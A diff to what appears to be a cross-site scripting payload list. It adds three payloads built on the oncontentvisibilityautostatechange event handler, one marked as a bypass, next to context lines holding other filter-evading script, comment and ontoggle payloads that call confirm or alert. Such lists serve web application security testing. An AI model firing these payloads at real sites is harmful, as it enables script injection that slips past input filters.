@@ -100,6 +100,9 @@
 <sCriPt>confirm(documen.cookie)</ScRipt>
 <!--><script>confirm/**/()/**/</script>
 <sCript>confirm()</sCript>
+"><input%0a%0atype="hidden"%0a%0aoncontentvisibilityautostatechange=confirm(/aungrecon/)%0d%0astyle=content-visibility:auto>
+"><input type="hidden" oncontentvisibilityautostatechange="confirm(/Bypassed/)" style="content-visibility:auto">
+<p oncontentvisibilityautostatechange="alert(/FirefoxOnly/)" style="content-visibility:auto">
 <script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
 <script //>//confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')//</script //
 -->""/></script><deTailS open x=">" ontoggle=(co\u006efirm)``>
